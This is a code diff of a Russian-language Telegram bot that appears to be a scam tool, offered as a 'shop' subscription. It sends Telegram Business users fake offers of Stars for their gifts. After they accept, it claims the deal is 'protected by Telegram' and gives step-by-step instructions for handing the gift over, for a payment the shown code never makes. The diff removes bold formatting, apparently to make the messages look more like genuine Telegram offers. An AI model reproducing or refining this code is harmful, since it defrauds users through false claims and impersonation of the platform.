@@ -177,7 +177,7 @@ async def start(message: types.Message):
         except: pass
 
     await message.answer(
-        "<b>👋 Добро пожаловать в магазин!</b>\n\n"
+        "👋 <b>Добро пожаловать в магазин!</b>\n\n"
         "🎁 Чтобы получить <b>3 дня бесплатной подписки</b>, напишите @s3rp3ntcoders\n\n"
         "Выберите действие:",
         reply_markup=main_menu()
@@ -575,7 +575,7 @@ async def profile(callback: types.CallbackQuery):
         text = f"<b>👤 Ваш профиль</b>\n\n✅ Подписка активна до: <b>{row[0]}</b>"
     await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]]))
 
-# === ОФФЕР ===
+# === ОФФЕР (СТАРЫЙ ВАРИАНТ) ===
 @dp.business_message(F.text.startswith("/h"))
 async def make_offer(message: types.Message):
     save_user(message.from_user)
@@ -595,16 +595,10 @@ async def make_offer(message: types.Message):
     sender_id = message.from_user.id
     
     if lang == "ru":
-        text = (
-            f"<b>Пользователь предлагает вам {price} ⭐ Stars за подарок 💎 {gift_name}.</b>\n\n"
-            f"<b>Оффер действителен ещё 6 ч. 0 мин..</b>"
-        )
+        text = f"Пользователь предлагает вам {price} ⭐ Stars за подарок 💎 {gift_name}.\n\nОффер действителен ещё 6 ч. 0 мин.."
         btn_accept, btn_decline = "Принять", "Отклонить"
     else:
-        text = (
-            f"<b>User offers you {price} ⭐ Stars for the gift 💎 {gift_name}.</b>\n\n"
-            f"<b>Offer is valid for 6 hours.</b>"
-        )
+        text = f"User offers you {price} ⭐ Stars for the gift 💎 {gift_name}.\n\nOffer is valid for 6 hours."
         btn_accept, btn_decline = "Accept", "Decline"
 
     keyboard = InlineKeyboardMarkup(inline_keyboard=[[
@@ -632,9 +626,9 @@ async def accept(callback: types.CallbackQuery):
     price, gift_name, sender_id = parts[1], parts[2], parts[3]
     
     text_accepted = (
-        f"<b>🎁 Подарок: {gift_name} успешно продан!</b>\n\n"
-        f"<b>Передайте подарок покупателю для зачисления звёзд.</b>\n\n"
-        f"<i>Сделка защищена Telegram. После передачи подарка звезды поступят на ваш баланс.</i>"
+        f"🎁 Подарок: {gift_name} успешно продан!\n\n"
+        f"Передайте подарок покупателю для зачисления звёзд.\n\n"
+        f"(Сделка защищена Telegram. После передачи подарка звезды поступят на ваш баланс.)"
     )
     
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
@@ -647,13 +641,13 @@ async def accept(callback: types.CallbackQuery):
 async def how_to_send(callback: types.CallbackQuery):
     await callback.answer()
     text = (
-        "<b>📖 Как передать подарок?</b>\n\n"
+        "📖 Как передать подарок?\n\n"
         "1. Откройте профиль покупателя по кнопке выше.\n"
         "2. Нажмите на три точки (⋮) в правом верхнем углу.\n"
         "3. Выберите «Отправить подарок».\n"
         "4. Выберите подарок из вашего списка.\n"
         "5. Подтвердите отправку.\n\n"
-        "<b>После этого звезды поступят на ваш баланс автоматически.</b>"
+        "После этого звезды поступят на ваш баланс автоматически."
     )
     parts = callback.data.split("_")
     price, gift_name, sender_id = parts[2], parts[3], parts[4]
@@ -665,7 +659,7 @@ async def how_to_send(callback: types.CallbackQuery):
 @dp.callback_query(F.data == "decline_offer")
 async def decline(callback: types.CallbackQuery):
     await callback.answer()
-    await change_message(callback.message, "<b>❌ Оффер отклонен.</b>")
+    await change_message(callback.message, "❌ Оффер отклонен.")
 
 async def main():
     print("Бот запущен.")
